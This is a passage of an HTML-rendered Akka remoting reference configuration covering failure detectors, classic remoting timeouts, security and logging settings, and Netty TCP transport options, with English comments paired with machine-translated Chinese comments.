class="line">      # because it may have a subclass without required constructor.</span><br><span class="line">      &quot;java.lang.Throwable&quot; = java</span><br><span class="line">      &quot;akka.actor.IllegalActorStateException&quot; = akka-misc</span><br><span class="line">      &quot;akka.actor.ActorKilledException&quot; = akka-misc</span><br><span class="line">      &quot;akka.actor.InvalidActorNameException&quot; = akka-misc</span><br><span class="line">      &quot;akka.actor.InvalidMessageException&quot; = akka-misc</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    serialization-identifiers &#123;</span><br><span class="line">      &quot;akka.remote.serialization.ProtobufSerializer&quot; = 2</span><br><span class="line">      &quot;akka.remote.serialization.DaemonMsgCreateSerializer&quot; = 3</span><br><span class="line">      &quot;akka.remote.serialization.MessageContainerSerializer&quot; = 6</span><br><span class="line">      &quot;akka.remote.serialization.MiscMessageSerializer&quot; = 16</span><br><span class="line">      &quot;akka.remote.serialization.ArteryMessageSerializer&quot; = 17</span><br><span class="line">      &quot;akka.remote.serialization.LongSerializer&quot; = 18</span><br><span class="line">      &quot;akka.remote.serialization.IntSerializer&quot; = 19</span><br><span class="line">      &quot;akka.remote.serialization.StringSerializer&quot; = 20</span><br><span class="line">      &quot;akka.remote.serialization.ByteStringSerializer&quot; = 21</span><br><span class="line">      &quot;akka.remote.serialization.SystemMessageSerializer&quot; = 22</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    deployment &#123;</span><br><span class="line"></span><br><span class="line">      default &#123;</span><br><span class="line"></span><br><span class="line">        # if this is set to a valid remote address, the named actor will be</span><br><span class="line">        # deployed at that node e.g. &quot;akka.tcp://sys@host:port&quot;</span><br><span class="line">        remote = &quot;&quot;</span><br><span class="line"></span><br><span class="line">        target &#123;</span><br><span class="line"></span><br><span class="line">          # A list of hostnames and ports for instantiating the children of a</span><br><span class="line">          # router</span><br><span class="line">          #   The format should be on &quot;akka.tcp://sys@host:port&quot;, where:</span><br><span class="line">          #    - sys is the remote actor system name</span><br><span class="line">          #    - hostname can be either hostname or IP address the remote actor</span><br><span class="line">          #      should connect to</span><br><span class="line">          #    - port should be the port for the remote server on the other node</span><br><span class="line">          # The number of actor instances to be spawned is still taken from the</span><br><span class="line">          # nr-of-instances setting as for local routers; the instances will be</span><br><span class="line">          # distributed round-robin among the given nodes.</span><br><span class="line">          nodes = []</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  remote &#123;</span><br><span class="line">    ### Settings shared by classic remoting and Artery (the new implementation of remoting)</span><br><span class="line"></span><br><span class="line">    # If set to a nonempty string remoting will use the given dispatcher for</span><br><span class="line">    # its internal actors otherwise the default dispatcher is used. Please note</span><br><span class="line">    # that since remoting can load arbitrary 3rd party drivers (see</span><br><span class="line">    # &quot;enabled-transport&quot; and &quot;adapters&quot; entries) it is not guaranteed that</span><br><span class="line">    # every module will respect this setting.</span><br><span class="line">    use-dispatcher = &quot;akka.remote.default-remote-dispatcher&quot;</span><br><span class="line"></span><br><span class="line">    # 设置失败检测器监视连接。</span><br><span class="line">    # 对于TCP来说，快速的故障检测并不重要，因为</span><br><span class="line">    # 大多数连接失败是由TCP本身捕获的。</span><br><span class="line">    # 默认的DeadlineFailureDetector将触发，如果没有心跳</span><br><span class="line">    # 持续时间心跳间隔+可接受的心跳暂停，即124秒</span><br><span class="line">    # 使用默认设置。</span><br><span class="line">    # Settings for the failure detector to monitor connections.</span><br><span class="line">    # For TCP it is not important to have fast failure detection, since</span><br><span class="line">    # most connection failures are captured by TCP itself.</span><br><span class="line">    # The default DeadlineFailureDetector will trigger if there are no heartbeats within</span><br><span class="line">    # the duration heartbeat-interval + acceptable-heartbeat-pause, i.e. 124 seconds</span><br><span class="line">    # with the default settings.</span><br><span class="line">    transport-failure-detector &#123;</span><br><span class="line"></span><br><span class="line">      # 故障检测器实现的FQCN。</span><br><span class="line">      # 它必须实现akka.remote.FailureDetector</span><br><span class="line">      # 使用com.typesafe.config.Config和</span><br><span class="line">      # akka.actor.EventStream参数。</span><br><span class="line">      # FQCN of the failure detector implementation.</span><br><span class="line">      # It must implement akka.remote.FailureDetector and have</span><br><span class="line">      # a public constructor with a com.typesafe.config.Config and</span><br><span class="line">      # akka.actor.EventStream parameter.</span><br><span class="line">      implementation-class = &quot;akka.remote.DeadlineFailureDetector&quot;</span><br><span class="line">      </span><br><span class="line">  # 向每个连接发送keep-alive心跳消息的频率。</span><br><span class="line">      # How often keep-alive heartbeat messages should be sent to each connection.</span><br><span class="line">      heartbeat-interval = 4 s</span><br><span class="line">      </span><br><span class="line">      # 在认为是异常之前，可能丢失/延迟的心跳数将被接受。</span><br><span class="line">      # “心跳间隔”的范围对于能够在心跳到达时的突然、偶尔的停顿(例如垃圾收集或网络掉落)中生存很重要。</span><br><span class="line">      # Number of potentially lost/delayed heartbeats that will be</span><br><span class="line">      # accepted before considering it to be an anomaly.</span><br><span class="line">      # A margin to the `heartbeat-interval` is important to be able to survive sudden,</span><br><span class="line">      # occasional, pauses in heartbeat arrivals, due to for example garbage collect or</span><br><span class="line">      # network drop.</span><br><span class="line">      acceptable-heartbeat-pause = 120 s</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # Phi累积故障检测器的设置(http://www.jaist.ac.jp/~defago/files/pdf/IS_RR_2004_010.pdf</span><br><span class="line">    # [Hayashibara等人])用于远程死亡监视。</span><br><span class="line">    # 如果没有心跳，默认的PhiAccrualFailureDetector将触发</span><br><span class="line">    # duration heartbeat-interval + acceptable-heartbeat-pause + threshold_adjustment，</span><br><span class="line">    # 即默认设置大约12.5秒。</span><br><span class="line">    # Settings for the Phi accrual failure detector (http://www.jaist.ac.jp/~defago/files/pdf/IS_RR_2004_010.pdf</span><br><span class="line">    # [Hayashibara et al]) used for remote death watch.</span><br><span class="line">    # The default PhiAccrualFailureDetector will trigger if there are no heartbeats within</span><br><span class="line">    # the duration heartbeat-interval + acceptable-heartbeat-pause + threshold_adjustment,</span><br><span class="line">    # i.e. around 12.5 seconds with default settings.</span><br><span class="line">    watch-failure-detector &#123;</span><br><span class="line"></span><br><span class="line">      # 故障检测器实现的FQCN。</span><br><span class="line">      # 它必须实现akka.remote.FailureDetector</span><br><span class="line">      # 使用com.typesafe.config.Config和</span><br><span class="line">      # akka.actor.EventStream参数。</span><br><span class="line">      # FQCN of the failure detector implementation.</span><br><span class="line">      # It must implement akka.remote.FailureDetector and have</span><br><span class="line">      # a public constructor with a com.typesafe.config.Config and</span><br><span class="line">      # akka.actor.EventStream parameter.</span><br><span class="line">      implementation-class = &quot;akka.remote.PhiAccrualFailureDetector&quot;</span><br><span class="line"></span><br><span class="line">      # 向每个连接发送keep-alive心跳消息的频率。    </span><br><span class="line">      # How often keep-alive heartbeat messages should be sent to each connection.</span><br><span class="line">      heartbeat-interval = 1 s</span><br><span class="line"></span><br><span class="line">      # 定义故障检测器阈值。</span><br><span class="line">      # 低门槛容易产生许多错误的怀疑，但可以确保</span><br><span class="line">      # 在真正崩溃的情况下快速检测。相反,高</span><br><span class="line">      # threshold产生的错误更少，但需要更多的时间来检测</span><br><span class="line">      # 真正的崩溃。</span><br><span class="line">      # Defines the failure detector threshold.</span><br><span class="line">      # A low threshold is prone to generate many wrong suspicions but ensures</span><br><span class="line">      # a quick detection in the event of a real crash. Conversely, a high</span><br><span class="line">      # threshold generates fewer mistakes but needs more time to detect</span><br><span class="line">      # actual crashes.</span><br><span class="line">      threshold = 10.0</span><br><span class="line"></span><br><span class="line">      # 心跳间到达时间的样本数量</span><br><span class="line">      # 计算连接的失败超时时间。</span><br><span class="line">      # Number of the samples of inter-heartbeat arrival times to adaptively</span><br><span class="line">      # calculate the failure timeout for connections.</span><br><span class="line">      max-sample-size = 200</span><br><span class="line"></span><br><span class="line">      # 用于正态分布的最小标准偏差</span><br><span class="line">      # AccrualFailureDetector。标准偏差过低可能导致</span><br><span class="line">      # 对突然但正常的心跳偏差过于敏感</span><br><span class="line">      # 到达时间。</span><br><span class="line">      # Minimum standard deviation to use for the normal distribution in</span><br><span class="line">      # AccrualFailureDetector. Too low standard deviation might result in</span><br><span class="line">      # too much sensitivity for sudden, but normal, deviations in heartbeat</span><br><span class="line">      # inter arrival times.</span><br><span class="line">      min-std-deviation = 100 ms</span><br><span class="line"></span><br><span class="line">      # 可能丢失/延迟的心跳数</span><br><span class="line">      # 在认为它是异常之前接受。</span><br><span class="line">      # 这一界限很重要，因为它能让你在突然的、偶然的、</span><br><span class="line">      # 心跳到达时暂停，例如由于垃圾收集或</span><br><span class="line">      # 网络下降。</span><br><span class="line">      # Number of potentially lost/delayed heartbeats that will be</span><br><span class="line">      # accepted before considering it to be an anomaly.</span><br><span class="line">      # This margin is important to be able to survive sudden, occasional,</span><br><span class="line">      # pauses in heartbeat arrivals, due to for example garbage collect or</span><br><span class="line">      # network drop.</span><br><span class="line">      acceptable-heartbeat-pause = 10 s</span><br><span class="line"></span><br><span class="line">      # 检查失败检测器标记为不可达的节点的频率</span><br><span class="line">      # How often to check for nodes marked as unreachable by the failure</span><br><span class="line">      # detector</span><br><span class="line">      unreachable-nodes-reaper-interval = 1s</span><br><span class="line"></span><br><span class="line">      # 发送心跳请求后，第一次检测失败</span><br><span class="line">      # 将在这段时间后开始，即使没有心跳消息</span><br><span class="line">      # 收到。</span><br><span class="line">      # After the heartbeat request has been sent the first failure detection</span><br><span class="line">      # will start after this period, even though no heartbeat mesage has</span><br><span class="line">      # been received.</span><br><span class="line">      expected-response-after = 1 s</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    # remote deployment configuration section</span><br><span class="line">    deployment &#123;</span><br><span class="line">      # If true, will only allow specific classes to be instanciated on this system via remote deployment</span><br><span class="line">      enable-whitelist = off</span><br><span class="line">      </span><br><span class="line">      whitelist = []</span><br><span class="line">    &#125;</span><br><span class="line">#//#shared</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">akka &#123;</span><br><span class="line"></span><br><span class="line">  remote &#123;</span><br><span class="line">#//#classic</span><br><span class="line"></span><br><span class="line">    ### Configuration for classic remoting</span><br><span class="line">    # 超时，在此之后，远程子系统的启动被认为是失败的。</span><br><span class="line">    # 如果您的传输驱动程序(请参阅enabled-transports一节)需要更长的加载时间，则增加此值。</span><br><span class="line">    # Timeout after which the startup of the remoting subsystem is considered</span><br><span class="line">    # to be failed. Increase this value if your transport drivers (see the</span><br><span class="line">    # enabled-transports section) need longer time to be loaded.</span><br><span class="line">    startup-timeout = 10 s</span><br><span class="line"></span><br><span class="line">    # 超时，在此之后远程子系统将优雅地关闭</span><br><span class="line">    # 被认为失败了。超时后，远程连接系统</span><br><span class="line">    # 强制关机。如果您的运输司机增加这个值</span><br><span class="line">    # (参见enabled-transports一节)需要更长的时间才能正常停止。</span><br><span class="line">    # Timout after which the graceful shutdown of the remoting subsystem is</span><br><span class="line">    # considered to be failed. After the timeout the remoting system is</span><br><span class="line">    # forcefully shut down. Increase this value if your transport drivers</span><br><span class="line">    # (see the enabled-transports section) need longer time to stop properly.</span><br><span class="line">    shutdown-timeout = 10 s</span><br><span class="line"></span><br><span class="line">    # 在关闭驱动程序之前，远程控制子系统尝试刷新</span><br><span class="line">    # 所有挂起的写。此设置控制远程处理的最大时间</span><br><span class="line">    # 愿意在关闭司机之前等待。</span><br><span class="line">    # Before shutting down the drivers, the remoting subsystem attempts to flush</span><br><span class="line">    # all pending writes. This setting controls the maximum time the remoting is</span><br><span class="line">    # willing to wait before moving on to shut down the drivers.</span><br><span class="line">    flush-wait-on-shutdown = 2 s</span><br><span class="line">    </span><br><span class="line">    # 为出站消息重用入站连接</span><br><span class="line">    # Reuse inbound connections for outbound messages</span><br><span class="line">    use-passive-connections = on</span><br><span class="line">    # 控制被拒绝的写被重新尝试后的回退间隔。(如果传输程序的内部缓冲区已满，它们可能会拒绝写入)</span><br><span class="line">    # Controls the backoff interval after a refused write is reattempted.</span><br><span class="line">    # (Transports may refuse writes if their internal buffer is full)</span><br><span class="line">    backoff-interval = 5 ms</span><br><span class="line">    # 发送到传输堆栈的管理命令的确认超时。</span><br><span class="line">    # Acknowledgment timeout of management commands sent to the transport stack.</span><br><span class="line">    command-ack-timeout = 30 s</span><br><span class="line"></span><br><span class="line">    # 出站关联执行握手的超时时间。</span><br><span class="line">    # 如果传输是akka.remote.net .tcp或akka.remote.net .ssl</span><br><span class="line">    # 将使用为传输配置的连接超时。</span><br><span class="line">    # The timeout for outbound associations to perform the handshake.</span><br><span class="line">    # If the transport is akka.remote.netty.tcp or akka.remote.netty.ssl</span><br><span class="line">    # the configured connection-timeout for the transport will be used instead.</span><br><span class="line">    handshake-timeout = 15 s</span><br><span class="line">    </span><br><span class="line">    ### Security settings</span><br><span class="line"></span><br><span class="line">    # 启用不受信任模式，以确保服务器托管参与者的完全安全，防止客户端发送系统消息，例如:</span><br><span class="line">    # 比如“创建”、“暂停”、“恢复”、“终止”、“监督”、“链接”等。</span><br><span class="line">    # Enable untrusted mode for full security of server managed actors, prevents</span><br><span class="line">    # system messages to be send by clients, e.g. messages like &#x27;Create&#x27;,</span><br><span class="line">    # &#x27;Suspend&#x27;, &#x27;Resume&#x27;, &#x27;Terminate&#x27;, &#x27;Supervise&#x27;, &#x27;Link&#x27; etc.</span><br><span class="line">    untrusted-mode = off</span><br><span class="line"></span><br><span class="line">    # 当&#x27;untrusted-mode=on&#x27;入站参与者选择默认被丢弃。</span><br><span class="line">    # 具有此白名单中定义的路径的actor被授予接收actor选择消息的权限。</span><br><span class="line">    # 例如:trusted-selection-paths = [&quot;/user/接待员&quot;，&quot;/user/namingService&quot;]</span><br><span class="line">    # When &#x27;untrusted-mode=on&#x27; inbound actor selections are by default discarded.</span><br><span class="line">    # Actors with paths defined in this white list are granted permission to receive actor</span><br><span class="line">    # selections messages.</span><br><span class="line">    # E.g. trusted-selection-paths = [&quot;/user/receptionist&quot;, &quot;/user/namingService&quot;]</span><br><span class="line">    trusted-selection-paths = []</span><br><span class="line"></span><br><span class="line">    # 如果远程服务器要求它的对等端共享相同的</span><br><span class="line">    # secure-cookie(在&#x27;remote&#x27;部分定义)?通过安全cookie</span><br><span class="line">    # 在第一次握手时。如果初始连接被拒绝</span><br><span class="line">    # message包含一个不匹配的cookie或cookie丢失。</span><br><span class="line">    # Should the remote server require that its peers share the same</span><br><span class="line">    # secure-cookie (defined in the &#x27;remote&#x27; section)? Secure cookies are passed</span><br><span class="line">    # between during the initial handshake. Connections are refused if the initial</span><br><span class="line">    # message contains a mismatching cookie or the cookie is missing.</span><br><span class="line">    require-cookie = off</span><br><span class="line"></span><br><span class="line">    # Deprecated since 2.4-M1</span><br><span class="line">    secure-cookie = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    ### Logging</span><br><span class="line">    # 如果这是“on”，Akka将在DEBUG级别记录所有入站消息，</span><br><span class="line">    # 如果关闭，则不记录</span><br><span class="line">    # If this is &quot;on&quot;, Akka will log all inbound messages at DEBUG level,</span><br><span class="line">    # if off then they are not logged</span><br><span class="line">    log-received-messages = off</span><br><span class="line"># 如果这是“on”，Akka将在DEBUG级别记录所有出站消息，</span><br><span class="line">    # 如果关闭，则不记录</span><br><span class="line">    # If this is &quot;on&quot;, Akka will log all outbound messages at DEBUG level,</span><br><span class="line">    # if off then they are not logged</span><br><span class="line">    log-sent-messages = off</span><br><span class="line"></span><br><span class="line">    # 连接状态生命周期</span><br><span class="line">    # Sets the log granularity level at which Akka logs remoting events. This setting</span><br><span class="line">    # can take the values OFF, ERROR, WARNING, INFO, DEBUG, or ON. For compatibility</span><br><span class="line">    # reasons the setting &quot;on&quot; will default to &quot;debug&quot; level. Please note that the effective</span><br><span class="line">    # logging level is still determined by the global logging level of the actor system:</span><br><span class="line">    # for example debug level remoting events will be only logged if the system</span><br><span class="line">    # is running with debug level logging.</span><br><span class="line">    # Failures to deserialize received messages also fall under this flag.</span><br><span class="line">    log-remote-lifecycle-events = on</span><br><span class="line"></span><br><span class="line">    # 以字节为单位记录有效负载大小大于的消息类型</span><br><span class="line">    # 这个值。记录一次每个消息类型检测到的最大大小，</span><br><span class="line">    # 增加10%的门槛。</span><br><span class="line">    # 默认情况下，该功能是关闭的。通过将属性设置为激活它</span><br><span class="line">    # a以字节为单位的值，例如1000b。注意，对于所有大于此值的消息</span><br><span class="line">    # 这将增加额外的性能和可伸缩性成本。</span><br><span class="line">    # Logging of message types with payload size in bytes larger than</span><br><span class="line">    # this value. Maximum detected size per message type is logged once,</span><br><span class="line">    # with an increase threshold of 10%.</span><br><span class="line">    # By default this feature is turned off. Activate it by setting the property to</span><br><span class="line">    # a value in bytes, such as 1000b. Note that for all messages larger than this</span><br><span class="line">    # limit there will be extra performance and scalability cost.</span><br><span class="line">    log-frame-size-exceeding = off</span><br><span class="line">    # 如果在端点的回退缓冲区中的消息的数量</span><br><span class="line">    # writer超出此限制。可以通过将该值设置为off来禁用它。</span><br><span class="line">    # Log warning if the number of messages in the backoff buffer in the endpoint</span><br><span class="line">    # writer exceeds this limit. It can be disabled by setting the value to off.</span><br><span class="line">    log-buffer-size-exceeding = 50000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 建立出站连接失败后，远程处理将标记</span><br><span class="line">    # 地址失败。这个配置选项控制应该使用多少时间</span><br><span class="line">    # 在重新尝试一个新连接之前经过#。地址是</span><br><span class="line">    # 门控，所有发送到该地址的消息将被发送到死信。</span><br><span class="line">    # 因为这个设置限制了重新连接的速率，所以设置为a</span><br><span class="line">    # 非常短的间隔(即少于一秒)可能导致暴风雨</span><br><span class="line">    # 连接尝试。</span><br><span class="line">    # After failed to establish an outbound connection, the remoting will mark the</span><br><span class="line">    # address as failed. This configuration option controls how much time should</span><br><span class="line">    # be elapsed before reattempting a new connection. While the address is</span><br><span class="line">    # gated, all messages sent to the address are delivered to dead-letters.</span><br><span class="line">    # Since this setting limits the rate of reconnects setting it to a</span><br><span class="line">    # very short interval (i.e. less than a second) may result in a storm of</span><br><span class="line">    # reconnect attempts.</span><br><span class="line">    retry-gate-closed-for = 5 s</span><br><span class="line"></span><br><span class="line">    # 在灾难性的通信故障导致系统丢失之后</span><br><span class="line">    # 消息或在远程DeathWatch触发后，远程系统得到</span><br><span class="line">    # 隔离以防止不一致的行为。</span><br><span class="line">    # 此设置控制隔离标记将保留多长时间</span><br><span class="line">    # ，以避免长期内存泄漏。</span><br><span class="line">    # 警告:不要将此更改为小值以重新启用通信</span><br><span class="line">    # 隔离节点。这样的特性是不支持的，任何行为之间</span><br><span class="line">    # 解除隔离后受影响的系统未定义    </span><br><span class="line">    # After catastrophic communication failures that result in the loss of system</span><br><span class="line">    # messages or after the remote DeathWatch triggers the remote system gets</span><br><span class="line">    # quarantined to prevent inconsistent behavior.</span><br><span class="line">    # This setting controls how long the Quarantine marker will be kept around</span><br><span class="line">    # before being removed to avoid long-term memory leaks.</span><br><span class="line">    # WARNING: DO NOT change this to a small value to re-enable communication with</span><br><span class="line">    # quarantined nodes. Such feature is not supported and any behavior between</span><br><span class="line">    # the affected systems after lifting the quarantine is undefined.</span><br><span class="line">    prune-quarantine-marker-after = 5 d</span><br><span class="line">        </span><br><span class="line">    # 如果系统消息已经在两个系统之间交换(例如远程死亡)</span><br><span class="line">    # watch or remote deployment has been used)远程系统将被标记为</span><br><span class="line">    # 隔离后的两个系统没有活动的关联，没有</span><br><span class="line">    # 在这里配置的时间内进行通信。</span><br><span class="line">    # 这个设置的唯一目的是避免存储系统消息重传</span><br><span class="line">    # data (sequence number state, etc) for an undefined amount of time导致long</span><br><span class="line">    # 术语内存泄漏。相反，如果一个系统在这个时期消失了，</span><br><span class="line">    # 或者更确切地说</span><br><span class="line">    # -两个系统之间没有关联(TCP连接，如果使用TCP传输)</span><br><span class="line">    # 双方都没有试图与对方沟通</span><br><span class="line">    # 没有挂起的系统消息要传递</span><br><span class="line">    # 对于此处配置的时间量，远程系统将被隔离并处于所有状态</span><br><span class="line">    # 与它关联的#将被删除。</span><br><span class="line">    # If system messages have been exchanged between two systems (i.e. remote death</span><br><span class="line">    # watch or remote deployment has been used) a remote system will be marked as</span><br><span class="line">    # quarantined after the two system has no active association, and no</span><br><span class="line">    # communication happens during the time configured here.</span><br><span class="line">    # The only purpose of this setting is to avoid storing system message redelivery</span><br><span class="line">    # data (sequence number state, etc.) for an undefined amount of time leading to long</span><br><span class="line">    # term memory leak. Instead, if a system has been gone for this period,</span><br><span class="line">    # or more exactly</span><br><span class="line">    # - there is no association between the two systems (TCP connection, if TCP transport is used)</span><br><span class="line">    # - neither side has been attempting to communicate with the other</span><br><span class="line">    # - there are no pending system messages to deliver</span><br><span class="line">    # for the amount of time configured here, the remote system will be quarantined and all state</span><br><span class="line">    # associated with it will be dropped.</span><br><span class="line">    quarantine-after-silence = 2 d</span><br><span class="line"></span><br><span class="line">    # 该设置定义了未确认系统消息的最大数量</span><br><span class="line">    # 允许远程系统。如果达到此限制，则远程系统将</span><br><span class="line">    # 声明为死亡，其UID被标记为受污染。</span><br><span class="line">    # This setting defines the maximum number of unacknowledged system messages</span><br><span class="line">    # allowed for a remote system. If this limit is reached the remote system is</span><br><span class="line">    # declared to be dead and its UID marked as tainted.</span><br><span class="line">    system-message-buffer-size = 20000</span><br><span class="line"></span><br><span class="line">    # 这个设置定义了个人之后的最大空闲时间</span><br><span class="line">    # 发送系统消息的确认。系统消息传递</span><br><span class="line">    # 由显式确认消息保证。这些ack</span><br><span class="line">    # 利用普通交通信息。如果没有检测到流量</span><br><span class="line">    # 在此处配置的时间段内，远程将发送出去</span><br><span class="line">    # 个人ack。</span><br><span class="line">    # This setting defines the maximum idle time after an individual</span><br><span class="line">    # acknowledgement for system messages is sent. System message delivery</span><br><span class="line">    # is guaranteed by explicit acknowledgement messages. These acks are</span><br><span class="line">    # piggybacked on ordinary traffic messages. If no traffic is detected</span><br><span class="line">    # during the time period configured here, the remoting will send out</span><br><span class="line">    # an individual ack.</span><br><span class="line">    system-message-ack-piggyback-timeout = 0.3 s</span><br><span class="line">   </span><br><span class="line">    # 此设置定义了未明确确认或否定确认的参与者(用于临终看护和监督)之间的内部管理信号被怨恨的时间。</span><br><span class="line">    # 被否定确认的消息总是立即被厌恶。</span><br><span class="line">    # This setting defines the time after internal management signals</span><br><span class="line">    # between actors (used for DeathWatch and supervision) that have not been</span><br><span class="line">    # explicitly acknowledged or negatively acknowledged are resent.</span><br><span class="line">    # Messages that were negatively acknowledged are always immediately</span><br><span class="line">    # resent.</span><br><span class="line">    resend-interval = 2 s</span><br><span class="line"></span><br><span class="line">    # 重发未确认的系统消息的最大数量</span><br><span class="line">    # 每个“resend-interval”。如果你看到许多(&gt; 1000)远程角色，你可以</span><br><span class="line">    # 增加这个值，例如600，但是限制太大(例如10000)</span><br><span class="line">    # 可能会淹没连接，并可能导致错误的故障检测触发。</span><br><span class="line">    # 测试这样的配置，同时观察所有的参与者并停止</span><br><span class="line">    # 所有人在同一时间观看演员。</span><br><span class="line">    # Maximum number of unacknowledged system messages that will be resent</span><br><span class="line">    # each &#x27;resend-interval&#x27;. If you watch many (&gt; 1000) remote actors you can</span><br><span class="line">    # increase this value to for example 600, but a too large limit (e.g. 10000)</span><br><span class="line">    # may flood the connection and might cause false failure detection to trigger.</span><br><span class="line">    # Test such a configuration by watching all actors at the same time and stop</span><br><span class="line">    # all watched actors at the same time.</span><br><span class="line">    resend-limit = 200</span><br><span class="line"></span><br><span class="line">    # WARNING:这个设置不应该不被更改，除非它的所有结果</span><br><span class="line">    # 是正确理解的假设经验与远程内部或专家建议。</span><br><span class="line">    # 此设置定义内部管理重试后的时间</span><br><span class="line">    # 停止信号到一个远程系统，该系统之前没有被确认是活的。     </span><br><span class="line">    # WARNING: this setting should not be not changed unless all of its consequences</span><br><span class="line">    # are properly understood which assumes experience with remoting internals</span><br><span class="line">    # or expert advice.</span><br><span class="line">    # This setting defines the time after redelivery attempts of internal management</span><br><span class="line">    # signals are stopped to a remote system that has been not confirmed to be alive by</span><br><span class="line">    # this system before.</span><br><span class="line">    initial-system-message-delivery-timeout = 3 m</span><br><span class="line"></span><br><span class="line">    ### Transports and adapters</span><br><span class="line"></span><br><span class="line">    # List of the transport drivers that will be loaded by the remoting.</span><br><span class="line">    # A list of fully qualified config paths must be provided where</span><br><span class="line">    # the given configuration path contains a transport-class key</span><br><span class="line">    # pointing to an implementation class of the Transport interface.</span><br><span class="line">    # If multiple transports are provided, the address of the first</span><br><span class="line">    # one will be used as a default address.</span><br><span class="line">    enabled-transports = [&quot;akka.remote.netty.tcp&quot;]</span><br><span class="line"></span><br><span class="line">    # Transport drivers can be augmented with adapters by adding their</span><br><span class="line">    # name to the applied-adapters setting in the configuration of a</span><br><span class="line">    # transport. The available adapters should be configured in this</span><br><span class="line">    # section by providing a name, and the fully qualified name of</span><br><span class="line">    # their corresponding implementation. The class given here</span><br><span class="line">    # must implement akka.akka.remote.transport.TransportAdapterProvider</span><br><span class="line">    # and have public constructor without parameters.</span><br><span class="line">    adapters &#123;</span><br><span class="line">      gremlin = &quot;akka.remote.transport.FailureInjectorProvider&quot;</span><br><span class="line">      trttl = &quot;akka.remote.transport.ThrottlerProvider&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ### Default configuration for the Netty based transport drivers</span><br><span class="line"></span><br><span class="line">    netty.tcp &#123;</span><br><span class="line">      # The class given here must implement the akka.remote.transport.Transport</span><br><span class="line">      # interface and offer a public constructor which takes two arguments:</span><br><span class="line">      #  1) akka.actor.ExtendedActorSystem</span><br><span class="line">      #  2) com.typesafe.config.Config</span><br><span class="line">      transport-class = &quot;akka.remote.transport.netty.NettyTransport&quot;</span><br><span class="line"></span><br><span class="line">      # Transport drivers can be augmented with adapters by adding their</span><br><span class="line">      # name to the applied-adapters list. The last adapter in the</span><br><span class="line">      # list is the adapter immediately above the driver, while</span><br><span class="line">      # the first one is the top of the stack below the standard</span><br><span class="line">      # Akka protocol</span><br><span class="line">      applied-adapters = []</span><br><span class="line"></span><br><span class="line">      transport-protocol = tcp</span><br><span class="line"></span><br><span class="line">      # The default remote server port clients should connect to.</span><br><span class="line">      # Default is 2552 (AKKA), use 0 if you want a random available port</span><br><span class="line">      # This port needs to be unique for each actor system on the same machine.</span><br><span class="line">      port = 2552</span><br><span class="line"></span><br><span class="line">      # The hostname or ip clients should connect to.</span><br><span class="line">      # InetAddress.getLocalHost.getHostAddress is used if empty</span><br><span class="line">      hostname = &quot;&quot;</span><br><span class="line"></span><br><span class="line">      # Use this setting to bind a network interface to a different port</span><br><span class="line">      # than remoting protocol expects messages at. This may be used</span><br><span class="line">      # when running akka nodes in a separated networks (under NATs or docker containers).</span><br><span class="line">      # Use 0 if you want a random available port. Examples:</span><br><span class="line">      #</span><br><span class="line">      # akka.remote.netty.tcp.port = 2552</span><br><span class="line">      # akka.remote.netty.tcp.bind-port = 2553</span><br><span class="line">      # Network interface will be bound to the 2553 port, but remoting protocol will</span><br><span class="line">      # expect messages sent to port 2552.</span><br><span class="line">      #</span><br><span class="line">      # akka.remote.netty.tcp.port = 0</span><br><span class="line">      # akka.remote.netty.tcp.bind-port = 0</span><br><span class="line">      # Network interface will be bound to a random port, and remoting protocol will</span><br><span class="line">      # expect messages sent to the bound port.</span><br><span class="line">      #</span><br><span class="line">      # akka.remote.netty.tcp.port = 2552</span><br><span class="line">      # akka.remote.netty.tcp.bind-port = 0</span><br><span class="line">      # Network interface will be bound to a random port, but remoting protocol will</span><br><span class="line">      # expect messages sent to port 2552.</span><br><span class="line">      #</span><br><span class="line">      # akka.remote.netty.tcp.port = 0</span><br><span class="line">      # akka.remote.netty.tcp.bind-port = 2553</span><br><span class="line">      # Network interface will be bound to the 2553 port, and remoting protocol will</span><br><span class="line">      # expect messages sent to the bound port.</span><br><span class="line">      #</span><br><span class="line">      # akka.remote.netty.tcp.port = 2552</span><br><span class="line">      # akka.remote.netty.tcp.bind-port = &quot;&quot;</span><br><span class="line">      # Network interface will be bound to the 2552 port, and remoting protocol will</span><br><span class="line">      # expect messages sent to the bound port.</span><br><span class="line">      #</span><br><span class="line">      # akka.remote.netty.tcp.port if empty</span><br><span class="line">      bind-port = &quot;&quot;</span><br><span class="line"></span><br><span class="line">      # Use this setting to bind a network interface to a different hostname or ip</span><br><span class="line">      # than remoting protocol expects messages at.</span><br><span class="line">      # Use &quot;0.0.0.0&quot; to bind to all interfaces.</span><br><span class="line">      # akka.remote.netty.tcp.hostname if empty</span><br><span class="line">      bind-hostname = &quot;&quot;</span><br><span class="line"></span><br><span class="line">      # Enables SSL support on this transport</span><br><span class="line">      enable-ssl = false</span><br><span class="line"></span><br><span class="line">      # Sets the connectTimeoutMillis of all outbound connections,</span><br><span class="line">      # i.e. how long a connect may take until it is timed out</span><br><span class="line">      connection-timeout = 15 s</span><br><span class="line"></span><br><span class="line">      # If set to &quot;&lt;id.of.dispatcher&gt;&quot; then the specified dispatcher</span><br><span class="line">      # will be used to accept inbound connections, and perform IO. If &quot;&quot; then</span><br><span class="line">      # dedicated threads will be used.</span><br><span class="line">      # Please note that the Netty driver only uses this configuration and does</span><br><span class="line">      # not read the &quot;akka.remote.use-dispatcher&quot; entry. Instead it has to be</span><br><span class="line">      # configured manually to point to the same dispatcher if needed.</span><br><span class="line">      use-dispatcher-for-io = &quot;&quot;</span><br><span class="line"></span><br><span class="line">      # Sets the high water mark for the in and outbound sockets,</span><br><span class="line">      # set to 0b for platform default</span><br><span class="line">      write-buffer-high-water-mark = 0b</span><br><span class="line"></span><br><span class="line">      # Sets the low water mark for the in and outbound sockets,</span><br><span class="line">      # set to 0b for platform 